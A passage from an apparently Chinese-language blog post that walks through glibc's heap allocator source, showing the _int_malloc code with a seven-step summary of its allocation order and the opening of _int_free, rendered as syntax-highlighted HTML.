punctuation">{</span>              victim <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span>                      <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                victim <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">/* Avoid removing the first entry for a size so that the skip                 list does not have to be rerouted.  */</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">!=</span> <span class="token function">last</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> victim<span class="token operator">-></span>size <span class="token operator">==</span> victim<span class="token operator">-></span>fd<span class="token operator">-></span>size<span class="token punctuation">)</span>                victim <span class="token operator">=</span> victim<span class="token operator">-></span>fd<span class="token punctuation">;</span>              remainder_size <span class="token operator">=</span> size <span class="token operator">-</span> nb<span class="token punctuation">;</span>              <span class="token function">unlink</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">/* Exhaust */</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>remainder_size <span class="token operator">&lt;</span> MINSIZE<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                  <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span>                    victim<span class="token operator">-></span>size <span class="token operator">|</span><span class="token operator">=</span> NON_MAIN_ARENA<span class="token punctuation">;</span>                <span class="token punctuation">}</span>              <span class="token comment" spellcheck="true">/* Split */</span>              <span class="token keyword">else</span>                <span class="token punctuation">{</span>                  remainder <span class="token operator">=</span> <span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">/* We cannot assume the unsorted list is empty and therefore                     have to perform a complete insert here.  */</span>                  bck <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>                  fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>fwd<span class="token operator">-></span>bk <span class="token operator">!=</span> bck<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                      errstr <span class="token operator">=</span> <span class="token string">"malloc(): corrupted unsorted chunks"</span><span class="token punctuation">;</span>                      <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                  remainder<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>                  remainder<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>                  bck<span class="token operator">-></span>fd <span class="token operator">=</span> remainder<span class="token punctuation">;</span>                  fwd<span class="token operator">-></span>bk <span class="token operator">=</span> remainder<span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>remainder_size<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                      remainder<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                      remainder<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                  <span class="token function">set_head</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb <span class="token operator">|</span> PREV_INUSE <span class="token operator">|</span>                            <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena <span class="token operator">?</span> NON_MAIN_ARENA <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token function">set_head</span> <span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token function">set_foot</span> <span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">/*         Search for a chunk by scanning bins, starting with next largest         bin. This search is strictly by best-fit; i.e., the smallest         (with ties going to approximately the least recently used) chunk         that fits is selected.         The bitmap avoids needing to check that most blocks are nonempty.         The particular case of skipping all bins during warm-up phases         when no chunks have been returned yet is faster than it might look.       */</span>      <span class="token operator">++</span>idx<span class="token punctuation">;</span>      bin <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>      block <span class="token operator">=</span> <span class="token function">idx2block</span> <span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span>      map <span class="token operator">=</span> av<span class="token operator">-></span>binmap<span class="token punctuation">[</span>block<span class="token punctuation">]</span><span class="token punctuation">;</span>      bit <span class="token operator">=</span> <span class="token function">idx2bit</span> <span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">/* Skip rest of block if there are no more set bits in this block.  */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>bit <span class="token operator">></span> map <span class="token operator">||</span> bit <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>              <span class="token keyword">do</span>                <span class="token punctuation">{</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">++</span>block <span class="token operator">>=</span> BINMAPSIZE<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* out of bins */</span>                    <span class="token keyword">goto</span> use_top<span class="token punctuation">;</span>                <span class="token punctuation">}</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>map <span class="token operator">=</span> av<span class="token operator">-></span>binmap<span class="token punctuation">[</span>block<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              bin <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> <span class="token punctuation">(</span>block <span class="token operator">&lt;&lt;</span> BINMAPSHIFT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              bit <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token comment" spellcheck="true">/* Advance to bin with set bit. There must be one. */</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bit <span class="token operator">&amp;</span> map<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>              bin <span class="token operator">=</span> <span class="token function">next_bin</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">;</span>              bit <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>              <span class="token function">assert</span> <span class="token punctuation">(</span>bit <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token comment" spellcheck="true">/* Inspect the bin. It is likely to be non-empty */</span>          victim <span class="token operator">=</span> <span class="token function">last</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">/*  If a false alarm (empty bin), clear the bit. */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">==</span> bin<span class="token punctuation">)</span>            <span class="token punctuation">{</span>              av<span class="token operator">-></span>binmap<span class="token punctuation">[</span>block<span class="token punctuation">]</span> <span class="token operator">=</span> map <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span>bit<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Write through */</span>              bin <span class="token operator">=</span> <span class="token function">next_bin</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">;</span>              bit <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token keyword">else</span>            <span class="token punctuation">{</span>              size <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">/*  We know the first chunk in this bin is big enough to use. */</span>              <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              remainder_size <span class="token operator">=</span> size <span class="token operator">-</span> nb<span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">/* unlink */</span>              <span class="token function">unlink</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">/* Exhaust */</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>remainder_size <span class="token operator">&lt;</span> MINSIZE<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                  <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span>                    victim<span class="token operator">-></span>size <span class="token operator">|</span><span class="token operator">=</span> NON_MAIN_ARENA<span class="token punctuation">;</span>                <span class="token punctuation">}</span>              <span class="token comment" spellcheck="true">/* Split */</span>              <span class="token keyword">else</span>                <span class="token punctuation">{</span>                  remainder <span class="token operator">=</span> <span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">/* We cannot assume the unsorted list is empty and therefore                     have to perform a complete insert here.  */</span>                  bck <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>                  fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>fwd<span class="token operator">-></span>bk <span class="token operator">!=</span> bck<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                      errstr <span class="token operator">=</span> <span class="token string">"malloc(): corrupted unsorted chunks 2"</span><span class="token punctuation">;</span>                      <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                  remainder<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>                  remainder<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>                  bck<span class="token operator">-></span>fd <span class="token operator">=</span> remainder<span class="token punctuation">;</span>                  fwd<span class="token operator">-></span>bk <span class="token operator">=</span> remainder<span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">/* advertise as last remainder */</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span>                    av<span class="token operator">-></span>last_remainder <span class="token operator">=</span> remainder<span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>remainder_size<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                      remainder<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                      remainder<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                  <span class="token function">set_head</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb <span class="token operator">|</span> PREV_INUSE <span class="token operator">|</span>                            <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena <span class="token operator">?</span> NON_MAIN_ARENA <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token function">set_head</span> <span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token function">set_foot</span> <span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    use_top<span class="token punctuation">:</span>      <span class="token comment" spellcheck="true">/*         If large enough, split off the chunk bordering the end of memory         (held in av->top). Note that this is in accord with the best-fit         search rule.  In effect, av->top is treated as larger (and thus         less well fitting) than any other available chunk since it can         be extended to be as large as necessary (up to system         limitations).         We require that av->top always exists (i.e., has size >=         MINSIZE) after initialization, so if it would otherwise be         exhausted by current request, it is replenished. (The main         reason for ensuring it exists is that we may need MINSIZE space         to put in fenceposts in sysmalloc.)       */</span>      victim <span class="token operator">=</span> av<span class="token operator">-></span>top<span class="token punctuation">;</span>      size <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb <span class="token operator">+</span> MINSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          remainder_size <span class="token operator">=</span> size <span class="token operator">-</span> nb<span class="token punctuation">;</span>          remainder <span class="token operator">=</span> <span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>          av<span class="token operator">-></span>top <span class="token operator">=</span> remainder<span class="token punctuation">;</span>          <span class="token function">set_head</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb <span class="token operator">|</span> PREV_INUSE <span class="token operator">|</span>                    <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena <span class="token operator">?</span> NON_MAIN_ARENA <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">set_head</span> <span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> p<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">/* When we are using atomic ops to free fast chunks we can get         here for all block sizes.  */</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">have_fastchunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">malloc_consolidate</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">/* restore original bin index */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span>            idx <span class="token operator">=</span> <span class="token function">smallbin_index</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">else</span>            idx <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">/*         Otherwise, relay to handle system-dependent cases       */</span>      <span class="token keyword">else</span>        <span class="token punctuation">{</span>          <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">sysmalloc</span> <span class="token punctuation">(</span>nb<span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>            <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> p<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="int-malloc函数的整体思路。"><a href="#int-malloc函数的整体思路。" class="headerlink" title="_int_malloc函数的整体思路。"></a>_int_malloc函数的整体思路。</h3><p>第一步：如果进程没有关联的分配区，就通过sysmalloc从操作系统分配内存。<br>第二步：从fastbin查找对应大小的chunk并返回，如果失败进入第三步。<br>第三步：从smallbin查找对应大小的chunk并返回，或者将fastbin中的空闲chunk合并放入unsortedbin中，如果失败进入第四步。<br>第四步：遍历unsortedbin，从unsortedbin中查找对应大小的chunk并返回，根据大小将unsortedbin中的空闲chunk插入smallbin或者largebin中。进入第五步。<br>第五步：从largebin指定位置查找对应大小的chunk并返回，如果失败进入第六步。<br>第六步：从largebin中大于指定位置的双向链表中查找对应大小的chunk并返回，如果失败进入第七步。<br>第七步：从topchunk中分配对应大小的chunk并返回，topchunk中没有足够的空间，就查找fastbin中是否有空闲chunk，如果有，就合并fastbin中的chunk并加入到unsortedbin中，然后跳回第四步。如果fastbin中没有空闲chunk，就通过sysmalloc从操作系统分配内存。</p><h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h3><p>这就是malloc源码里面的第二个大重点了。</p><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token function">_int_free</span> <span class="token punctuation">(</span>mstate av<span class="token punctuation">,</span> mchunkptr p<span class="token punctuation">,</span> <span class="token keyword">int</span> have_lock<span class="token punctuation">)</span><span class="token punctuation">{</span>  INTERNAL_SIZE_T size<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* its size */</span>  mfastbinptr <span class="token operator">*</span>fb<span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">/* associated fastbin */</span>  mchunkptr nextchunk<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* next contiguous chunk */</span>  INTERNAL_SIZE_T nextsize<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* its size */</span>  <span class="token keyword">int</span> nextinuse<span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">/* true if nextchunk is used */</span>  INTERNAL_SIZE_T prevsize<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* size of previous contiguous chunk */</span>  mchunkptr bck<span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">/* misc temp for linking */</span>  mchunkptr fwd<span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">/* misc temp for linking */</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>errstr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> locked <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  size <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Little security check which won't hurt performance: the     allocator never wrapps around at the end of the address space.     Therefore we can exclude some size values which might appear     here by accident or by "design" from some intruder.  */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span> p <span class="token operator">></span> <span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span> <span class="token operator">-</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">misaligned_chunk</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      errstr <span class="token operator">=</span> <span class="token string">"free(): invalid pointer"</span><span class="token punctuation">;</span>    errout<span class="token punctuation">:</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>have_lock <span class="token operator">&amp;&amp;</span> locked<span class="token punctuation">)</span>        <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token function">mutex_unlock</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>av<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> errstr<span class="token punctuation">,</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">/* We know that each chunk is at least MINSIZE bytes in size or a     multiple of MALLOC_ALIGNMENT.  */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;</span> MINSIZE <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">aligned_OK</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      errstr <span class="token operator">=</span> <span class="token string">"free(): invalid size"</span><span class="token punctuation">;</span>      <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token function">check_inuse_chunk</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/*    If eligible, place chunk on a fastbin so it can be found    and used quickly in malloc.  */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">get_max_fast</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token macro property">#<span class="token directive keyword">if</span> TRIM_FASTBINS</span>      <span class="token comment" spellcheck="true">/*    If TRIM_FASTBINS set, don't place chunks    bordering top into fastbins      */</span>      <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token operator">!=</span> av<span class="token operator">-></span>top<span class="token punctuation">)</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>      <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span>                 <span class="token operator">>=</span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* We might not have a lock at this point and concurrent modifications       of system_mem might have let to a false positive.  Redo the test       after getting the lock.  */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>have_lock        <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token function">assert</span> <span class="token punctuation">(</span>locked <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>av<span class="token operator">-></span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>          locked <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ            <span class="token operator">||</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span><span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> av<span class="token operator">-></span>system_mem<span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>        errstr <span class="token operator">=</span> <span class="token string">"free(): invalid next size (fast)"</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> have_lock<span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token function">mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>av<span class="token 